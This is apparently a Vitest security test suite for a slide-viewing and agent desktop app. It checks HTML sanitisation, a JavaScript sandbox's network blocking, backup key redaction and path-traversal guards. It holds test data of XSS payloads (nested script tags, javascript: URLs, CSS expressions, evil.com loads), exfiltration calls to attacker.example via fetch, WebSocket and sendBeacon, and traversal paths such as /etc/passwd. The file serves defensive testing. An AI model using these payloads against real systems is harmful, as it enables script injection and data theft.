import { fireEvent, render } from "@testing-library/react";
import { createElement } from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { createOfficeTools } from "../agent/tools/office-tools";
import { createSandboxTools } from "../agent/tools/sandbox-tools";
import { SlidesViewer } from "../components/preview/SlidesViewer";
import {
  buildSlidesHtmlDocument,
  createStarterDemoSlidesHtml,
  parseSlidesHtmlDocument,
  parseSlidesHtmlWithRegex,
  sanitizeSlideHtml,
  updateSlideInHtmlDocument,
  validateSlidesHtml,
} from "../office";
import { TauriPlatformAdapter } from "../platform/tauri-adapter";
import { clearAllLocalData, exportBackupBundle, kvSet } from "../storage/db";
import { WorkspaceVFS } from "../storage/workspace-vfs";
import type { NewApiConfig } from "../types";

const tauriPluginFsMocks = vi.hoisted(() => ({
  mkdir: vi.fn(async () => undefined),
  writeFile: vi.fn(async () => undefined),
}));

vi.mock("@tauri-apps/plugin-fs", () => ({
  mkdir: tauriPluginFsMocks.mkdir,
  writeFile: tauriPluginFsMocks.writeFile,
}));

describe("安全加固专项测试（幻灯片 XSS、JS 沙箱、备份脱敏、目录穿越防护）", () => {
  let vfs: WorkspaceVFS;

  beforeEach(async () => {
    await clearAllLocalData();
    vfs = new WorkspaceVFS();
    tauriPluginFsMocks.mkdir.mockClear();
    tauriPluginFsMocks.writeFile.mockClear();
    if (typeof globalThis.ResizeObserver === "undefined") {
      globalThis.ResizeObserver = class {
        observe() {}
        unobserve() {}
        disconnect() {}
      };
    }
  });

  afterEach(() => {
    vi.restoreAllMocks();
    document.body.innerHTML = "";
  });

  it("sanitizeSlideHtml 清除 script/iframe/事件属性/危险协议/危险样式及嵌套变体，并保留合法 SVG 与 Bento 结构", () => {
    const xssPayload = [
      '<div class="bento-grid" onclick="alert(1)" style="display: grid; width: expression(alert(1)); background: url(javascript:alert(2));">',
      '  <div class="bento-card span-7" onmouseover=alert(3) style="color: #f7f8f8; behavior: url(xss.htc); -moz-binding: url(xss.xml#x); @import \'https://evil.com/a.css\';">',
      '    <h3 class="slide-h3">营收分析</h3>',
      '    <script>alert("xss1")</script>',
      '    <scr<script>ipt>alert("nested1")</scr</script>ipt>',
      '    <scr<script></script>ipt>alert("nested2")</scr<script></script>ipt>',
      '    <<script>script>alert("nested3")<</script>/script>',
      '    <script src="https://evil.com/a.js">',
      '    </script>',
      '    <!--><script>alert("comment-smuggle")</script>',
      '    <iframe src="https://evil.com" srcdoc="<script>alert(4)</script>"><iframe>nested</iframe></iframe>',
      '    <object data="https://evil.com/a.swf"></object>',
      '    <embed src="https://evil.com/b.swf" />',
      '    <form action="javascript:alert(5)"><button formaction="vbscript:msgbox(1)">点我</button></form>',
      '    <base href="https://evil.com/" />',
      '    <meta http-equiv="refresh" content="0;url=https://evil.com" />',
      '    <link rel="stylesheet" href="https://evil.com/evil.css" />',
      '    <img src="x" onerror=\'alert(6)\' />',
      '    <img/src="https://cdn.example.com/ok.png"/onload=alert(7)>',
      '    <img src="data:text/html,<script>alert(8)</script>" alt="bad" />',
      '    <img src="data:image/png;base64,iVBORw0KGgo=" alt="good-img" />',
      '    <a href="  \t\n JaVaScRiPt:alert(9)" xlink:href="&#x6a;avascript:alert(10)">链接1</a>',
      '    <a href="#slide-2">锚点</a>',
      '    <svg viewBox="0 0 600 280" width="600" height="280" onload="alert(11)">',
      '      <foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(12)</script></body></foreignObject>',
      '      <defs><linearGradient id="g1"><stop offset="0%" stop-color="#5e6ad2" /></linearGradient></defs>',
      '      <rect class="chart-bar-accent" x="78" y="44" width="38" height="200" rx="5" fill="url(#g1)" data-region="华东区" />',
      '      <text x="97" y="36" fill="#f7f8f8">385</text>',
      "    </svg>",
      "  </div>",
      "</div>",
    ].join("\n");

    const clean = sanitizeSlideHtml(xssPayload);

    // 危险标签与嵌套变体应完全被移除
    expect(clean).not.toMatch(/<\s*\/?\s*(script|iframe|object|embed|form|base|meta|link|foreignObject)\b/i);
    expect(clean).not.toContain('alert("xss1")');
    expect(clean).not.toContain('alert("nested2")');
    expect(clean).not.toContain("comment-smuggle");
    // 危险事件属性与 srcdoc 应被移除
    expect(clean).not.toMatch(/\son(?:click|mouseover|error|load)\b/i);
    expect(clean).not.toMatch(/\bsrcdoc\b/i);
    // 危险协议与危险 CSS 应被清除
    expect(clean).not.toMatch(/javascript:/i);
    expect(clean).not.toMatch(/vbscript:/i);
    expect(clean).not.toMatch(/data:text\/html/i);
    expect(clean).not.toMatch(/expression\s*\(/i);
    expect(clean).not.toMatch(/behavior\s*:/i);
    expect(clean).not.toMatch(/-moz-binding/i);
    expect(clean).not.toMatch(/@import/i);

    // 合法 Bento、图表 SVG、安全图片与安全样式应完整保留
    expect(clean).toContain('class="bento-grid"');
    expect(clean).toContain('class="bento-card span-7"');
    expect(clean).toContain("display: grid");
    expect(clean).toContain("color: #f7f8f8");
    expect(clean).toContain('src="https://cdn.example.com/ok.png"');
    expect(clean).toContain('src="data:image/png;base64,iVBORw0KGgo="');
    expect(clean).toContain('href="#slide-2"');
    expect(clean).toContain('<svg viewBox="0 0 600 280" width="600" height="280">');
    expect(clean).toContain("<linearGradient");
    expect(clean).toContain("<rect");
    expect(clean).toContain('data-region="华东区"');
    expect(clean).toContain(">385</text>");
  });

  it("幻灯片解析/构建/更新链路与 SlidesViewer 均强制执行 sanitizeSlideHtml", () => {
    const dirtySlide =
      '<div class="cover-stage" onclick="alert(1)"><h1 class="slide-h1">安全测试</h1><script>alert(2)</script><img src="javascript:alert(3)" /></div>';

    const doc = buildSlidesHtmlDocument({
      title: "XSS 拦截演示",
      theme: "linear-dark",
      slides: [{ title: "首页", html: dirtySlide }],
    });

    const parsedDom = parseSlidesHtmlDocument(doc);
    const parsedRegex = parseSlidesHtmlWithRegex(doc);
    for (const parsed of [parsedDom, parsedRegex]) {
      expect(parsed.slides[0].html).not.toContain("<script");
      expect(parsed.slides[0].html).not.toContain("onclick");
      expect(parsed.slides[0].html).not.toContain("javascript:");
      expect(parsed.slides[0].html).toContain("安全测试");
    }

    const updatedDoc = updateSlideInHtmlDocument(doc, 1, {
      html: '<p class="slide-lead" style="width: expression(alert(9)); color: #fff;">正文<iframe src="https://evil.com"></iframe></p>',
    });
    const parsedUpdated = parseSlidesHtmlDocument(updatedDoc);
    expect(parsedUpdated.slides[0].html).not.toContain("<iframe");
    expect(parsedUpdated.slides[0].html).not.toContain("expression(");
    expect(parsedUpdated.slides[0].html).toContain("color: #fff");

    // 渲染 SlidesViewer 确认主舞台、缩略图与全屏模式 DOM 中均无任何危险脚本或事件属性
    const bytes = new TextEncoder().encode(updatedDoc);
    const { container, getByLabelText } = render(
      createElement(SlidesViewer, { path: "safe.slides.html", bytes })
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.innerHTML).not.toContain("expression(");

    // 切换到全屏模式也应安全渲染
    fireEvent.click(getByLabelText("全屏放映"));
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("iframe")).toBeNull();
    expect(container.innerHTML).not.toContain("expression(");

    // 确认现有 starter demo 幻灯片在清洗后仍保持 0 违规通过体检
    const starter = createStarterDemoSlidesHtml();
    const report = validateSlidesHtml(starter);
    expect(report.ok).toBe(true);
    expect(report.issues).toEqual([]);
  });

  it("run_js_analysis 阻断 fetch/XMLHttpRequest/WebSocket/sendBeacon 等外泄接口并支持 dataPaths 多表联合分析", async () => {
    const officeTools = createOfficeTools(vfs);
    const sandboxTools = createSandboxTools(vfs);
    const excelCreate = officeTools.find((t) => t.name === "excel_create")!;
    const jsTool = sandboxTools.find((t) => t.name === "run_js_analysis")!;

    await excelCreate.execute("e_1", {
      path: "orders.xlsx",
      sheets: [
        {
          name: "订单",
          headers: ["单号", "金额"],
          rows: [
            ["ORD-01", 1000],
            ["ORD-02", 2500],
          ],
        },
      ],
    });
    await vfs.writeText(
      "payments.json",
      JSON.stringify([
        { orderId: "ORD-01", paid: 1000 },
        { orderId: "ORD-02", paid: 2000 },
      ])
    );

    // 1. 验证网络外泄接口全部被沙箱拦截
    await expect(
      jsTool.execute("s_fetch", {
        code: 'return fetch("https://attacker.example/leak");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_global_fetch", {
        code: 'return globalThis.fetch("https://attacker.example/leak");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_xhr", {
        code: "const x = new XMLHttpRequest(); return x;",
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_ws", {
        code: 'return new WebSocket("wss://attacker.example/ws");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_es", {
        code: 'return new EventSource("https://attacker.example/es");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_import", {
        code: 'return importScripts("https://attacker.example/payload.js");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    await expect(
      jsTool.execute("s_beacon", {
        code: 'return navigator.sendBeacon("https://attacker.example/beacon", "secret");',
      })
    ).rejects.toThrow(/禁止网络请求/);

    // 2. 验证 dataPaths 多表联合对账与 dataPath 向下兼容
    const multiRes = await jsTool.execute("s_multi", {
      dataPath: "orders.xlsx",
      dataPaths: ["orders.xlsx", "payments.json"],
      code: `
        const orders = datasets["orders.xlsx"].records;
        const payments = datasets["payments.json"];
        const paidMap = new Map(payments.map(p => [p.orderId, p.paid]));
        const diffs = orders.map(o => ({
          id: o["单号"],
          diff: Number(o["金额"]) - Number(paidMap.get(o["单号"]) || 0)
        }));
        return { singleCount: data.records.length, diffs };
      `,
    });
    const parsed = JSON.parse((multiRes.content[0] as { text: string }).text);
    expect(parsed.singleCount).toBe(2);
    expect(parsed.diffs).toEqual([
      { id: "ORD-01", diff: 0 },
      { id: "ORD-02", diff: 500 },
    ]);
  });

  it("exportBackupBundle 默认脱敏 apiKey 且标记 secretsRedacted: true，传 includeSecrets: true 时保留原密钥", async () => {
    const config: NewApiConfig = {
      brandName: "Mizurisu Agent",
      baseUrl: "https://relay.example.com",
      apiKey: "sk-super-secret-token-123456",
      protocolMode: "compatible",
      selectedModelId: "gpt-4o",
      thinkingLevel: "off",
      customModels: [],
      modelProtocolOverrides: {},
    };
    await kvSet("newapi_config", config);

    const redacted = await exportBackupBundle();
    expect(redacted.secretsRedacted).toBe(true);
    expect(redacted.config?.apiKey).toBe("");
    expect(redacted.config?.baseUrl).toBe("https://relay.example.com");

    const full = await exportBackupBundle({ includeSecrets: true });
    expect(full.secretsRedacted).toBe(false);
    expect(full.config?.apiKey).toBe("sk-super-secret-token-123456");
  });

  it("TauriPlatformAdapter.writeToNativeDirectory 严格阻断路径穿越、绝对路径、盘符与空路径段", async () => {
    const adapter = new TauriPlatformAdapter();
    const bytes = new Uint8Array([1, 2, 3]);

    const badPaths = [
      "",
      "/etc/passwd",
      "//server/share/evil.txt",
      "\\\\server\\share\\evil.txt",
      "C:\\Windows\\System32\\evil.dll",
      "d:/secret.txt",
      "C:relative_drive.txt",
      "../escape.txt",
      "reports/../../escape.txt",
      "reports\\..\\..\\escape.txt",
      "reports//empty.txt",
      "reports/",
      "./dot.txt",
      "bad\0file.txt",
    ];

    for (const bad of badPaths) {
      await expect(
        adapter.writeToNativeDirectory("D:\\workspace", bad, bytes)
      ).rejects.toThrow();
    }
    expect(tauriPluginFsMocks.writeFile).not.toHaveBeenCalled();

    // 合法相对路径（含嵌套目录与文件名中的 .. 非穿越字符）应正常放行
    await adapter.writeToNativeDirectory(
      "D:\\workspace\\",
      "reports\\2026\\q2..summary.xlsx",
      bytes
    );
    expect(tauriPluginFsMocks.mkdir).toHaveBeenCalledWith("D:\\workspace/reports/2026", {
      recursive: true,
    });
    expect(tauriPluginFsMocks.writeFile).toHaveBeenCalledWith(
      "D:\\workspace/reports/2026/q2..summary.xlsx",
      bytes
    );
  });
});
